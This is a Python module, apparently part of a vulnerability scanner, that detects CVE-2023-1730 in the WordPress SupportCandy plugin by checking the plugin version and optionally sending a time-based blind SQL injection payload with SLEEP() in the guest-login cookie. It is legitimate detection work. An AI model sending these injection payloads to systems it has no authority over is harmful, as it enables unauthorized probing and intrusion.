from __future__ import annotations

import json
import time
from typing import Any

from ...core.http import is_transport_error, normalize_url, request, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2023-1730"
NAME = "SupportCandy unauthenticated SQL injection via the guest login cookie"
COMPONENT = "WordPress plugin SupportCandy"
AFFECTED_RULE = (
    "SupportCandy before 3.1.5 (unauthenticated wpsc_guest_login_auth email SQL injection)"
)
PLUGIN_SLUG = "supportcandy"
COOKIE_NAME = "wpsc_guest_login_auth"
FIXED_VERSION = "3.1.5"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]


def classify_version(version: str | None) -> str:
    if not version:
        return "DETECTED_VERSION_UNKNOWN"
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required(FIXED_VERSION) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    finding = passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade SupportCandy to 3.1.5 or newer.",
        exploit_available=HAS_EXPLOIT,
    )
    parsed = parse_version_safe(finding.component_version)
    if parsed is not None and parsed < parse_version_required("3.0.0"):
        finding.detail += (
            " The guest-login cookie path used by this CVE was introduced in 3.0.0; "
            "2.x builds inside the advisory range (including 2.3.0) do not contain it, "
            "so the active timing probe is the discriminator."
        )
    return finding


def _cookie_header(email: str) -> str:
    payload = json.dumps({"email": email}, separators=(",", ":"), ensure_ascii=False)
    return f"{COOKIE_NAME}={payload}"


def _timed_get(
    base: str, email: str, timeout: int, proxy: str | None
) -> tuple[float, dict[str, Any]]:
    start = time.perf_counter()
    response = request(
        f"{base}/",
        method="GET",
        headers={"Cookie": _cookie_header(email)},
        timeout=timeout,
        proxy=proxy,
    )
    return time.perf_counter() - start, response


def _error(reason: str, endpoint: str, evidence: dict[str, Any] | None = None) -> Finding:
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="ERROR",
        confidence="LOW",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=endpoint,
        evidence=evidence,
        detail=f"The SupportCandy timing probe failed in transit ({reason}).",
        action="Retry when the target is reachable.",
    )


def run_timing_probe(
    target_url: str,
    delay: int = 1,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Compare a benign guest cookie with SLEEP(0) and SLEEP(delay) payloads."""
    base = normalize_url(target_url).rstrip("/")
    endpoint = f"{base}/"
    request_timeout = max(timeout, delay * 4 + 5)

    baseline, baseline_response = _timed_get(
        base, "proofcms-baseline@example.test", request_timeout, proxy
    )
    if is_transport_error(baseline_response):
        return _error(transport_error_detail(baseline_response), endpoint)

    control_email = "' AND (SELECT 42 FROM (SELECT(SLEEP(0)))NNTu)-- cLmu"
    control, control_response = _timed_get(base, control_email, request_timeout, proxy)
    if is_transport_error(control_response):
        return _error(transport_error_detail(control_response), endpoint)

    payload_email = f"' AND (SELECT 42 FROM (SELECT(SLEEP({delay})))NNTu)-- cLmu"
    payload, payload_response = _timed_get(base, payload_email, request_timeout, proxy)
    if is_transport_error(payload_response):
        return _error(transport_error_detail(payload_response), endpoint)

    evidence = {
        "endpoint": endpoint,
        "delay_seconds": delay,
        "baseline_seconds": round(baseline, 3),
        "control_seconds": round(control, 3),
        "payload_seconds": round(payload, 3),
        "cookie": f"{COOKIE_NAME}=<JSON email payload>",
    }
    floor = max(baseline, control)
    if payload >= delay * 0.8 and (payload - floor) >= delay * 0.6:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=endpoint,
            evidence=evidence,
            detail=(
                f"The guest login cookie carried a SLEEP({delay}) expression and delayed "
                f"the homepage by {payload - floor:.2f}s over the benign/SLEEP(0) controls. "
                "The probe is time-based and does not extract data."
            ),
            action="Upgrade SupportCandy to 3.1.5 or newer and rotate guest sessions.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=endpoint,
        evidence=evidence,
        detail=(
            "The homepage responded, but the SLEEP expression in the guest login cookie "
            "did not produce the expected delay over the controls; the plugin may be "
            "patched, inactive, or filtering the cookie."
        ),
        action="Confirm the installed SupportCandy version or retest on an affected build.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    result = run_timing_probe(target_url, delay=1, timeout=timeout, proxy=proxy)
    result.detail += " Safe mode uses a 1-second timing check; aggressive mode uses 3 seconds."
    return result


def run_aggressive_probe(
    target_url: str, timeout: int = 12, proxy: str | None = None
) -> Finding:
    return run_timing_probe(target_url, delay=3, timeout=timeout, proxy=proxy)


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del cms_version, aggressive_command, aggressive_args, kwargs
    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        return run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    return run_safe_probe(target_url, timeout=timeout, proxy=proxy)


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> dict[str, Any]:
    del target_url, timeout, proxy, aggressive_args, aggressive_command
    return {
        "removed": [],
        "remaining": [],
        "manual": [],
        "detail": "The timing probe only sends GET requests; no cleanup is required.",
    }


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["<3.1.5"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-24",
        "updated": "2026-11-24",
        "required_detectors": [PLUGIN_SLUG],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-1730",
            "https://wpscan.com/vulnerability/44b51a56-ff05-4d50-9327-fc9bab74d4b7/",
            "https://wordpress.org/plugins/supportcandy/",
        ],
    }
